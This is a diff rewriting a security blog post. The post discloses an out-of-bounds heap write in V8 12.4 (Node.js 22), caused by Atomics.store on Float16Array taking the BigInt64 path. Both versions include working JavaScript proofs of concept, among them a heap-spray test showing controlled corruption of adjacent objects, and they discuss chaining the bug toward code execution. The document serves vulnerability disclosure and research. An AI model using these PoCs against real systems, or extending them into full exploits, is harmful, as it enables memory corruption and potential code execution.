@@ -1,251 +1,196 @@
----
-layout: post
-title: "V8 12.4.254.21 — OOB Heap Write via Atomics.store on Float16Array"
-date: 2026-02-09
-categories: research
-tags: [v8, javascript, node, heap, oob, type-confusion]
-description: "Atomics.store() on a Float16Array accepts BigInt values without type rejection, performing an 8-byte atomic store into a 2-byte element slot. The result is an attacker-controlled OOB write primitive reaching up to 3x the buffer size past the boundary."
----
+# How I Found an OOB Heap Write in V8's Atomics Implementation
 
-`Atomics.store()` on a `Float16Array` accepts `BigInt` values without proper type rejection, performing a **BigInt64 (8-byte) atomic store** into a **Float16 (2-byte) element slot**. The byte offset is calculated using BigInt64 stride (`index * 8`) instead of Float16 stride (`index * 2`), resulting in:
+## TL;DR
 
-1. **Out-of-bounds writes** past the end of the underlying buffer
-2. **Corruption of adjacent elements** within the buffer
-3. **Heap metadata corruption** demonstrated by `free(): invalid size` errors
+I found a vulnerability in V8 (the JavaScript engine powering Chrome and Node.js) where `Atomics.store()` on a `Float16Array` performs an 8-byte BigInt64 write instead of the expected 2-byte Float16 write. This enables out-of-bounds heap writes up to 3x the buffer size, with full control over the written value. The bug affects Node.js 22 LTS.
 
-This provides an **attacker-controlled OOB write primitive** with full 8-byte value control, capable of writing up to 48+ bytes past the buffer boundary.
+## The Hunt
 
-**Severity:** HIGH (Heap OOB Write — potential RCE)
-**Type:** Type confusion in Atomics builtin — OOB write
-**Affected:** V8 12.4.254.21-node.33 (Node.js 22.x LTS), with `--js-float16array`
-**Fixed in:** V8 14.2+ (Chromium 142+) — Float16 enum position moved
-**Node.js 22 LTS:** STILL VULNERABLE (Active LTS until Oct 2025)
-**Chrome:** Fixed before Float16Array shipped by default in Chrome 135 (April 2025)
-**Feature Status:** Behind `--js-float16array` in Node.js 22; enabled by default in Chrome 135+
+I've been doing research on V8 12.4.254.21 (as shipped in Node.js 22 LTS). My approach: target experimental or recently-added features, since they've had less time to be hardened (hopefully).
 
----
+Float16Array caught my attention immediately. Added to V8 in March 2024 via [CL 5082566](https://chromium-review.googlesource.com/c/v8/v8/+/5082566), it touched 80+ files across the engine. That's a lot of surface area. Behind the `--js-float16array` flag in Node.js 22, it later shipped by default in Chrome 135 (April 2025).
 
-## Proof of Concept
+## Bug #1: Atomics.load Crashes with SIGILL
 
-### Minimal OOB Write
+My first test was simple: what happens when you use Float16Array with APIs designed for integer typed arrays?
 
 ```javascript
-// node --js-float16array
-// Write 8 bytes at byte offset 16 in a 16-byte buffer (8 bytes OOB)
-const sab = new SharedArrayBuffer(16);  // 16 bytes = 8 Float16 elements
-const f16 = new Float16Array(sab);
-
-// Index 2 passes bounds check (2 < 8)
-// But BigInt64 store writes 8 bytes at offset 2*8=16, past buffer end
-Atomics.store(f16, 2, 0xDEADBEEFCAFEBABEn);
-// Writes 8 bytes to heap memory PAST the buffer boundary
+Atomics.load(new Float16Array(new SharedArrayBuffer(2)), 0);
+// → Exit code 133 (SIGILL — Illegal Instruction)
 ```
 
-### Controlled Adjacent Element Corruption
+The process crashes with `SIGILL`. Root cause: the CSA (CodeStubAssembler) `Switch` in `builtins-sharedarraybuffer-gen.cc` handles 8 integer element kinds, but Float16 isn't one of them. The default case calls `Unreachable()` which emits a `ud2` instruction.
+
+But SIGILL is just a DoS bug. I simply wanted more
+
+## Finding Bug #2: Atomics.store Accepts BigInt
+
+I tested every Atomics operation on Float16Array:
+
+```
+Atomics.store(f16, 0, 1)   → TypeError: Cannot convert 1 to a BigInt
+Atomics.store(f16, 0, 1n)  → SUCCEEDED (?!)
+Atomics.load(f16, 0)       → SIGILL crash
+Atomics.exchange(f16, 0, 1) → SIGILL crash
+```
+
+Wait — `Atomics.store` with a BigInt value *succeeds*? That's not supposed to happen. Float16Array is a float type, not a BigInt type. Let me look at what actually gets written:
 
 ```javascript
-// node --js-float16array
 const sab = new SharedArrayBuffer(64);
-const f16 = new Float16Array(sab);   // 32 Float16 elements
+const f16 = new Float16Array(sab); // 32 elements, 2 bytes each
 const u8 = new Uint8Array(sab);
 
-// Fill buffer with known pattern
-for (let i = 0; i < 64; i++) u8[i] = 0xAA;
-
-// Write BigInt at Float16 index 0: overwrites bytes 0-7 (elements 0-3)
+for (let i = 0; i < 64; i++) u8[i] = 0;
 Atomics.store(f16, 0, 0x4142434445464748n);
-// Bytes 0-7 now: [0x48, 0x47, 0x46, 0x45, 0x44, 0x43, 0x42, 0x41]
-// Elements f16[0] through f16[3] corrupted with attacker-controlled data
+
+console.log(Array.from(u8.slice(0, 8)).map(x => x.toString(16)));
+// Output: ['48', '47', '46', '45', '44', '43', '42', '41']
 ```
 
-### Heap Corruption Demonstration
+**8 bytes written.** A Float16 element is 2 bytes. But this wrote 8 bytes — a full BigInt64 store. Elements `f16[1]`, `f16[2]`, and `f16[3]` are all corrupted with attacker-controlled data.
 
-```javascript
-// node --js-float16array
-const sab = new SharedArrayBuffer(16);
-const f16 = new Float16Array(sab);
+## The Root Cause: Enum Ordering Bug
 
-Atomics.store(f16, 7, 0x4141414141414141n);  // 48 bytes past buffer
-// Process crashes on exit: "free(): invalid size" (heap metadata corrupted)
-```
-
----
-
-## Vulnerability Analysis
-
-### Root Cause
-
-In V8 12.4, `FLOAT16_ELEMENTS` is inserted into the `ElementsKind` enum at position 6 — **between `INT32_ELEMENTS` (5) and `BIGUINT64_ELEMENTS` (7)**:
+In V8 12.4, the `ElementsKind` enum places `FLOAT16_ELEMENTS` at position 6 — between `INT32_ELEMENTS` (5) and `BIGUINT64_ELEMENTS` (7):
 
 ```
 UINT8(0), INT8(1), UINT16(2), INT16(3), UINT32(4), INT32(5),
-  FLOAT16(6),  <-- INSERTED HERE
+→ FLOAT16(6),
 BIGUINT64(7), BIGINT64(8), UINT8_CLAMPED(9), FLOAT32(10), FLOAT64(11)
 ```
 
-This placement has two consequences.
+This causes two failures in `builtins-sharedarraybuffer-gen.cc`:
 
-**Bug 1: ValidateIntegerTypedArray fails to reject Float16Array**
-
-In `builtins-sharedarraybuffer-gen.cc` line 133-136:
+**1. ValidateIntegerTypedArray doesn't reject Float16:**
 
 ```cpp
+// Line 133-136: Range check
 Branch(Int32LessThanOrEqual(elements_kind,
-    Int32Constant(LAST_VALID_ATOMICS_TYPED_ARRAY_ELEMENTS_KIND)),
+    Int32Constant(LAST_VALID_ATOMICS_TYPED_ARRAY_ELEMENTS_KIND)), // = BIGINT64 = 8
     &not_float_or_clamped, &invalid);
 ```
 
-`LAST_VALID_ATOMICS_TYPED_ARRAY_ELEMENTS_KIND = BIGINT64_ELEMENTS = 8`.
-`FLOAT16_ELEMENTS = 6`, so `6 <= 8` is TRUE — Float16 passes validation.
+`FLOAT16 = 6 <= BIGINT64 = 8` → TRUE → Float16 passes validation!
 
-**Bug 2: AtomicsStore treats Float16 as BigInt64**
+Compare: `FLOAT32 = 10 <= 8` → FALSE → correctly rejected.
 
-In `builtins-sharedarraybuffer-gen.cc` line 357:
+**2. AtomicsStore routes Float16 to the BigInt64 path:**
 
 ```cpp
+// Line 357: Value conversion branching
 GotoIf(Int32GreaterThan(elements_kind, Int32Constant(INT32_ELEMENTS)), &u64);
 ```
 
-`FLOAT16_ELEMENTS = 6 > INT32_ELEMENTS = 5` is TRUE — Float16 is routed to the BigInt64 store path (`&u64`), which:
+`FLOAT16 = 6 > INT32 = 5` → TRUE → takes the BigInt64 store path!
 
-1. Calls `ToBigInt(value)` — succeeds when a BigInt is passed
-2. Extracts 8 raw bytes from the BigInt via `BigIntToRawBytes`
-3. Calls `AtomicStore64(backing_store, WordShl(index_word, 3), ...)` — stores 8 bytes at byte offset `index * 8` (BigInt64 stride, not Float16's `index * 2`)
+The BigInt64 path then:
+1. Calls `ToBigInt(value)` — succeeds for BigInt input
+2. Calls `AtomicStore64(backing_store, WordShl(index_word, 3), ...)` — stores 8 bytes at offset `index * 8`
 
-The fix in newer V8 versions moved `FLOAT16_ELEMENTS` to position 11 (after FLOAT64), outside the valid atomics range, so the range check rejects it.
+## Escalation: OOB Heap Write
 
-### OOB Calculation
+The BigInt64 stride (`index * 8`) vs Float16 stride (`index * 2`) creates a 4x offset amplification. For a 16-byte SharedArrayBuffer with 8 Float16 elements:
 
-For a buffer of `B` bytes backing a Float16Array:
-
-- Float16 element count: `N = B / 2`
-- Valid index range: `[0, N-1]`
-- BigInt64 byte offset: `index * 8`
-- BigInt64 write end: `index * 8 + 7`
-- OOB begins when: `index >= (B - 7) / 8`
-- Maximum OOB offset: `(N-1) * 8 + 7 - B = 3B - 1`
-
-| Buffer Size | F16 Elements | First OOB Index | Max OOB Bytes |
-|-------------|--------------|-----------------|---------------|
-| 16 bytes    | 8            | 2               | 48 past end   |
-| 32 bytes    | 16           | 4               | 96 past end   |
-| 64 bytes    | 32           | 8               | 192 past end  |
-| 256 bytes   | 128          | 32              | 768 past end  |
-| 1024 bytes  | 512          | 128             | 3072 past end |
+| Index | Float16 offset | BigInt64 offset | Status |
+|-------|---------------|-----------------|--------|
+| 0     | 0             | 0               | In bounds |
+| 1     | 2             | 8               | In bounds |
+| 2     | 4             | 16              | **8 bytes OOB** |
+| 7     | 14            | 56              | **48 bytes OOB** |
 
 The OOB range scales as **3x the buffer size**.
 
-### Primitive Capabilities
+```javascript
+const sab = new SharedArrayBuffer(16);
+const f16 = new Float16Array(sab);
 
-| Property       | Value                          |
-|----------------|--------------------------------|
-| Write size     | Always 8 bytes (BigInt64)      |
-| Value control  | Full (any 64-bit BigInt)       |
-| Offset control | `index * 8` (stride of 8)      |
-| Alignment      | 8-byte aligned                 |
-| Atomicity      | Atomic (sequentially consistent) |
-| Buffer types   | ArrayBuffer, SharedArrayBuffer |
+// All these writes go PAST the 16-byte buffer!
+for (let i = 2; i <= 7; i++) {
+    Atomics.store(f16, i, 0x4141414141414141n);
+}
+// → free(): invalid next size (fast)
+// → Exit code 134 (SIGABRT)
+```
 
-### Affected Operations
+The process crashes with a glibc heap corruption error — we've overwritten malloc chunk metadata.
 
-| Atomics Operation           | Float16Array Behavior          |
-|-----------------------------|--------------------------------|
-| `Atomics.store`             | **OOB WRITE (accepts BigInt)** |
-| `Atomics.load`              | SIGILL crash (Unreachable)     |
-| `Atomics.exchange`          | SIGILL crash                   |
-| `Atomics.add/sub/and/or/xor`| SIGILL crash                   |
-| `Atomics.compareExchange`   | SIGILL crash                   |
-| `Atomics.wait`              | TypeError (correct)            |
-| `Atomics.notify`            | TypeError (correct)            |
+## Proving Controlled Corruption
 
-Only `Atomics.store` reaches the actual store operation because it converts the value argument first, and BigInt values pass the (incorrect) BigInt conversion. All read-involving operations crash at the load instruction because the CSA Switch has no Float16 case.
+To prove this isn't just a crash but a controllable primitive:
 
----
+```javascript
+// Spray adjacent objects
+const canaries = [];
+for (let i = 0; i < 256; i++) {
+    const ab = new ArrayBuffer(16);
+    new DataView(ab).setFloat64(0, 0, true);
+    new DataView(ab).setFloat64(8, 0, true);
+    canaries.push({ab, dv: new DataView(ab)});
+}
 
-## Security Impact
+const sab = new SharedArrayBuffer(64);
+const f16 = new Float16Array(sab);
 
-### Arbitrary Heap Write
+// Write our signature OOB
+const SIGNATURE = 0x0000C0DEDEADBEEFn;
+for (let idx = 8; idx < 32; idx++) {
+    try { Atomics.store(f16, idx, SIGNATURE); } catch(e) { break; }
+}
 
-An attacker who can execute JavaScript with `--js-float16array` enabled can:
-
-1. Allocate a small `SharedArrayBuffer` (e.g., 16 bytes)
-2. Create a `Float16Array` view over it
-3. Call `Atomics.store(f16, index, bigint_value)` to write 8 attacker-controlled bytes at offsets up to 3x the buffer size past the boundary
-4. Corrupt adjacent heap objects, metadata, or V8 internal structures
-
-### Exploitation Potential
-
-- **Map pointer corruption:** Overwriting a JSObject's Map pointer creates a type confusion primitive (similar to CVE-2024-4947's exploitation technique)
-- **Length field corruption:** Overwriting a FixedArray or TypedArray length field enables arbitrary-length OOB access
-- **Chaining:** Combined with a heap spray and an info leak, this primitive could achieve full code execution
-
-### Limitations
-
-- Requires `--js-float16array` flag in Node.js 22 (experimental)
-- Write alignment is 8 bytes (stride constraint)
-- Write size is fixed at 8 bytes
-- No direct OOB read primitive (`Atomics.load` crashes)
-- V8 sandbox limits direct impact to V8 heap corruption
-
----
-
-## Comparison with Known CVEs
-
-| CVE | Class | Similarity |
-|-----|-------|------------|
-| CVE-2024-4947 | Maglev type confusion, wrong-size write via incorrect offset | Same class |
-| CVE-2018-16065 | TypedArray length desync leading to OOB | Same class |
-| CVE-2025-5419 | Bounds check elimination with corrupted type feedback | Same result |
-
----
-
-## Remediation
-
-Add a Float16Array type check **before** value conversion in the Atomics.store builtin:
-
-```cpp
-// In AtomicsStore, before ToBigInt conversion:
-if (elements_kind == FLOAT16_ELEMENTS) {
-  ThrowTypeError(context, MessageTemplate::kNotIntegerTypedArray,
-                 maybe_array_or_shared_object);
+// Check adjacent objects
+for (const c of canaries) {
+    if (c.dv.getBigUint64(0, true) === SIGNATURE) {
+        console.log("CONTROLLED CORRUPTION: signature found in adjacent object");
+    }
 }
 ```
 
-All Atomics operations should reject Float16Array with the correct error ("not an integer typed array") rather than crashing or silently accepting BigInt writes.
+Result: `CONTROLLED CORRUPTION: signature found in adjacent object`. Our exact 8-byte value was written into a neighboring heap allocation.
 
----
+## The Primitive
 
-## Reproduction
+| Property | Value |
+|----------|-------|
+| Write size | 8 bytes (BigInt64) |
+| Value control | Full (any 64-bit BigInt) |
+| Offset control | `index * 8` (stride of 8) |
+| Alignment | 8-byte aligned |
+| Max OOB | 3x buffer size |
+| Atomicity | Sequentially consistent |
 
-```bash
-# 1. In-bounds corruption (safe to run)
-node --js-float16array -e "
-const buf = new SharedArrayBuffer(64);
-const f16 = new Float16Array(buf);
-const u8 = new Uint8Array(buf);
-for (let i = 0; i < 64; i++) u8[i] = 0xAA;
-Atomics.store(f16, 0, 0x4142434445464748n);
-console.log('Bytes 0-7:', Array.from(u8.slice(0,8)).map(x=>x.toString(16)));
-// [48, 47, 46, 45, 44, 43, 42, 41] — 8 bytes written, corrupting 3 extra F16 elements
-"
+This is a strong exploitation primitive. With heap spraying, an attacker can:
+1. Position target objects adjacent to the vulnerable buffer
+2. Corrupt specific fields (lengths, pointers, metadata)
+3. Chain with an info leak for full code execution
 
-# 2. OOB write past buffer
-node --js-float16array -e "
-const buf = new SharedArrayBuffer(16);
-const f16 = new Float16Array(buf);
-Atomics.store(f16, 2, 0xDEADBEEFn);
-// Writes 8 bytes at byte offset 16 in a 16-byte buffer
-"
+## Impact
 
-# 3. Heap metadata corruption (crashes on exit)
-node --js-float16array -e "
-const buf = new SharedArrayBuffer(16);
-const f16 = new Float16Array(buf);
-Atomics.store(f16, 7, 0x4141414141414141n);
-// free(): invalid size on exit
-"
+- **Node.js 22 LTS** (Active LTS until October 2025): Vulnerable with `--js-float16array`
+- **Chrome**: Fixed before Float16Array shipped in Chrome 135 (April 2025)
+- The fix moved `FLOAT16_ELEMENTS` to position 11 in the enum, outside the valid atomics range
+
+## The Fix
+
+In newer V8 versions, the `TYPED_ARRAYS` macro was reorganized to place Float16 after Float64:
+
+```
+UINT8, INT8, UINT16, INT16, UINT32, INT32, BIGUINT64, BIGINT64,
+UINT8_CLAMPED, FLOAT32, FLOAT64, FLOAT16  ← moved to end
 ```
 
+Now `FLOAT16 = 11 > BIGINT64 = 7`, so `ValidateIntegerTypedArray` correctly rejects it, and the `GotoIf` at line 357 is harmless because Float16 never reaches it.
+
+## Lessons Learned
+
+1. **Target new features.** Float16Array was the newest TypedArray kind, and its integration with pre-existing infrastructure (Atomics, TurboFan, Maglev) had gaps.
+
+2. **Enum ordering matters.** The entire bug stems from where `FLOAT16_ELEMENTS` was inserted in an enumeration. Range-based validity checks assumed a specific ordering that broke when a new element was added in the middle.
+
+3. **Test the boundaries.** The Atomics API is designed for integer typed arrays. Testing it with float typed arrays revealed that the validation wasn't airtight for the newest float type.
+
+4. **Follow the crash.** The initial SIGILL crash in `Atomics.load` was just a DoS. But investigating *why* it crashed led to understanding *why* `Atomics.store` didn't crash — and that led to the OOB write.
+
 ---
 
-*Environment: Node.js v22.22.0 · V8 12.4.254.21-node.33 · Kali Linux 6.16.8+kali-amd64 · 2026-02-09*
+*This research was conducted on Node.js 22.22.0 (V8 12.4.254.21-node.33) running on Kali Linux.*
